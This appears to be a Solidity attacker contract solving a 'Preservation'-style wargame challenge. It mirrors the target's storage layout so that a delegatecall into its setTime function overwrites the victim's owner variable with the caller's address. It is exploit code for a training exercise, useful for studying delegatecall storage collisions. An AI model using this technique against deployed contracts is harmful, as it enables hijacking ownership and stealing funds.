// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

contract PreservationAttacker {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    
    function setTime(uint _time) public {
        owner = msg.sender;
    }
}